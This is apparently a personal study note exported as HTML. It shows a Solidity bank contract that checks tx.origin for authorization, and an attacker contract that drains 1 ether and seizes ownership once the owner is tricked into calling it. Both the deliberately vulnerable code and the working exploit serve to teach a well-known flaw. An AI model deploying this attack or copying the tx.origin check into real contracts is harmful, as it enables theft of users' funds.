<!doctype html>
<html>

<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Vulnerable Tx.Origin contract (example)</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>

<body>
  <div class='page'>
    <h1 class='title'>Vulnerable Tx.Origin contract (example)</h1><br /><br /><span style="color:#a020f0;">Target
      Contract: BankOfEther (example address: 0xd8b934580fcE35a11B58C6D73aDeE468a2833fa8)</span><br />
    <div class="codebox">
      <div class="codebox">pragma&nbsp;solidity&nbsp;^0.6.6;<br /><br />contract&nbsp;BankOfEther&nbsp;<span
          style="color:#000000;font-weight:400">{</span><br />&nbsp;&nbsp;address&nbsp;owner;<br />&nbsp;&nbsp;mapping&nbsp;(address&nbsp;=&gt;uint)&nbsp;balances;<br />&nbsp;&nbsp;<br />&nbsp;&nbsp;constructor()&nbsp;public&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;owner&nbsp;=&nbsp;msg.sender;<br />&nbsp;&nbsp;}<br />&nbsp;&nbsp;&nbsp;&nbsp;<br />&nbsp;&nbsp;function&nbsp;deposit()&nbsp;public&nbsp;payable{<br />&nbsp;&nbsp;&nbsp;&nbsp;balances[msg.sender]&nbsp;=&nbsp;balances[msg.sender]+msg.value;
        <br />&nbsp;&nbsp;}<br />&nbsp;&nbsp;&nbsp;&nbsp;<br />&nbsp;&nbsp;function&nbsp;transferTo(address&nbsp;payable&nbsp;to,&nbsp;uint&nbsp;amount)&nbsp;public&nbsp;payable&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;require(tx.origin&nbsp;==&nbsp;owner);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&lt;--<br />&nbsp;&nbsp;&nbsp;&nbsp;to.transfer(amount);<br />&nbsp;&nbsp;}<br /><br />&nbsp;&nbsp;function&nbsp;changeOwner(address&nbsp;newOwner)&nbsp;public{<br />&nbsp;&nbsp;&nbsp;&nbsp;require(tx.origin&nbsp;==&nbsp;owner);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&lt;--<br />&nbsp;&nbsp;&nbsp;&nbsp;owner&nbsp;=&nbsp;newOwner;<br />&nbsp;&nbsp;}<br />&nbsp;<br />&nbsp;&nbsp;function&nbsp;kill()&nbsp;public&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;require(msg.sender&nbsp;==&nbsp;owner);<br />&nbsp;&nbsp;&nbsp;&nbsp;selfdestruct(msg.sender);<br />&nbsp;&nbsp;}<br /><span
          style="color:#000000;font-weight:400">}</span></div>
    </div><br /><br /><span style="color:#ff0000;">Attacker Contract: PhishingBankOfEther (example address:
      0x8431717927C4a3343bCf1626e7B5B1D31E240406)</span><br />Owner of this contract and attackerAddress:
    0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2<br />
    <div class="codebox">
      <div class="codebox">
        pragma&nbsp;solidity&nbsp;^0.6.6;<br /><br />interface&nbsp;targetInterface&nbsp;{<br />&nbsp;&nbsp;function&nbsp;transferTo(address&nbsp;payable&nbsp;to,&nbsp;uint&nbsp;amount)&nbsp;&nbsp;payable&nbsp;external&nbsp;;&nbsp;<br />&nbsp;&nbsp;function&nbsp;changeOwner(address&nbsp;newOwner)&nbsp;external;<br />&nbsp;&nbsp;function&nbsp;kill()&nbsp;external;<br />}<br /><br />contract&nbsp;PhishingBankOfEther&nbsp;<span
          style="color:#000000;font-weight:400">{</span><br />&nbsp;&nbsp;address&nbsp;payable&nbsp;attackerAddress;<br />&nbsp;&nbsp;targetInterface&nbsp;bankInterface&nbsp;=&nbsp;targetInterface(TARGET_CONTRACTS_ADDRESS);&nbsp;&nbsp;//0xd8b934580fcE35a11B58C6D73aDeE468a2833fa8<br />&nbsp;&nbsp;<br />&nbsp;&nbsp;constructor()&nbsp;public&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;attackerAddress&nbsp;=&nbsp;msg.sender;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2<br />&nbsp;&nbsp;}&nbsp;&nbsp;&nbsp;&nbsp;<br /><br />&nbsp;&nbsp;function&nbsp;test&nbsp;()&nbsp;payable&nbsp;public&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;bankInterface.transferTo(attackerAddress,&nbsp;1&nbsp;ether);<br />&nbsp;&nbsp;&nbsp;&nbsp;bankInterface.changeOwner(attackerAddress);<br />&nbsp;&nbsp;}<br /><span
          style="color:#000000;font-weight:400">}</span></div>
    </div><br />If we covince the owner of the <span style="color:#a020f0;">Target Contract</span> to use the <span
      style="color:#ff0000;">Attacker Contract</span> (phishing attack over chat, email, ...) <br /> ◇ first will be
    transferred 1 ether from the balance of the <span style="color:#a020f0;">Target Contract</span> to the <span
      style="color:#ff0000;">attackerAddress</span><br /> ◇ Then the owner of the Attacker Contract (<span
      style="color:#ff0000;">attackerAddress</span>) will become the new owner of the <span
      style="color:#a020f0;">Target Contract</span>
  </div>
</body>

</html>